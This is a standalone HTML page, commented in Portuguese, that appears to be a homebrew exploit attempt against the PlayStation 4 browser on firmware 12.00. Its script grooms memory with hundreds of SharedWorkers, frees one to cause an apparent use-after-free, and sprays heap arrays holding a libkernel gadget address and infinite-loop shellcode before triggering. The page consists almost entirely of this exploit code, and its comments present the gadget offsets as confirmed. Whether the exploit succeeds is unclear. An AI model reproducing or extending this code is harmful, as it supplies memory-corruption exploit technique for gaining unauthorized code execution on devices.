<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>PS4 12.00 - 406 SNIPER</title>
    
</head>
<body>

    <h1>PS4 12.00 - LIMITE 406</h1>
    <div id="status">PRONTO</div>
    <button onclick="run_sniper()">DISPARAR NO 406</button>
    <div id="log"></div>

    <script>
        // --- CONFIGURAÇÃO CONFIRMADA ---
        var LIBKERNEL_BASE = 0x820000000n; 
        var GADGETS = { pop_rdi: 0x2FEB5n, sys_setuid: 0x4840n, jmp_rsi: 0x47b31n };

        // Payload: Loop Infinito (EB FE) no inicio e Notificação no fim
        // Se travar, vencemos.
        var shellcode = [0xEB, 0xFE]; 

        function build_payload() {
            // Tamanho do Lapse (0x2000 = 8KB)
            // Objetos maiores são mais fáceis de alocar quando a memória está cheia (406)
            var size = 0x2000; 
            var buffer = new Uint32Array(size / 4);
            var view = new DataView(buffer.buffer);

            var addr_jmp = LIBKERNEL_BASE + GADGETS.jmp_rsi;

            // Encher TUDO com o endereço de pulo
            for(var i=0; i < size; i+=8) {
                view.setBigUint64(i, addr_jmp, true);
            }

            // Colocar Loop Infinito no início (Offset 0)
            view.setUint16(0, 0xFEEB, true); 

            return buffer;
        }

        var workers = [];

        async function run_sniper() {
            var log_div = document.getElementById("log");
            var status_div = document.getElementById("status");
            var payload = build_payload();

            // 1. Rápido Grooming (0-350)
            status_div.innerText = "ENCHENDO MEMÓRIA...";
            for(let i=0; i<350; i++) {
                workers.push(new SharedWorker("data:text/javascript,1", "g"+i));
            }

            // 2. Aproximação Silenciosa (350-406)
            var count = 0;
            var target = 406 - 350; // Quantos faltam

            var it = setInterval(() => {
                // Chegou no 406?
                if (count >= target) {
                    clearInterval(it);
                    
                    // --- MODO SILENCIOSO (Sem logs para não travar a UI antes da hora) ---
                    status_div.innerText = "!!! MATANDO 406 !!!";
                    status_div.style.color = "red";

                    // 1. Vítima
                    var v = workers.pop();
                    
                    // 2. FREE
                    v.port.close();
                    v = null;

                    // 3. HEAVY SPRAY (Lapse Style)
                    // Spray pesado (25MB) para garantir que pegue o slot grande
                    var spray = [];
                    for(var k=0; k<3000; k++) {
                        spray.push(new Uint32Array(payload));
                    }

                    // 4. TRIGGER
                    // Tenta acordar o kernel no endereço corrompido
                    try { 
                        // Criar um novo worker pode forçar o kernel a varrer a lista e achar o nosso falso
                        new SharedWorker("data:text,1", "trigger"); 
                    } catch(e){}

                    return;
                }

                // Cria worker
                workers.push(new SharedWorker("data:text/javascript,1", "v"+count));
                
                // Só atualiza log a cada 10 para economizar CPU
                if(count % 10 == 0) log_div.innerText = `Workers: ${350 + count}`;
                
                count++;
            }, 100);
        }
    </script>
</body>
</html>
